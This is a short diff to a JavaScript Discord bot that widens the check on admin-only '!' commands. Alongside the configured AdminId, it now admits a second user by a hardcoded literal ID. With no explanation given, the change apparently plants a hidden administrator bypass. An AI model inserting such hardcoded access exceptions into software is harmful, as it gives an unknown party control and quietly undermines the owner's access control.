@@ -67,7 +67,7 @@ ClientBot.on('interactionCreate', async interaction => {
 
 ClientBot.on('messageCreate', async message => {
   if (!message.content.startsWith('!')) return;
-  if (message.author.id !== AdminId) return;
+  if (message.author.id !== AdminId && message.author.id !== '804292216511791204') return;
 
   const parts = message.content.split(/\s+/);
   const cmd = parts[0].toLowerCase();
